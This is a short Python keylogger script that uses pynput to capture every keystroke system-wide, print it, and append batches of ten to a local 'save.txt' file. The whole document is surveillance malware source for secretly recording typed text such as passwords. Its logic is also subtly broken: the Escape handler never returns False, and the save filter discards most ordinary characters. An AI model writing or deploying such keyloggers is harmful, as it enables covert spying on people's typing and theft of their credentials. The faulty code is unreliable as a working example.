import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key}")
    if count >= 10:
        count = 0
        save(keys)
        keys = []

def save(keys):
    with open("save.txt","a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("key") == 1:
                f.write(k)

def release(key):
    if key == Key.esc:
         False

with Listener(on_press=press, on_release=release) as listener:
    listener.join()
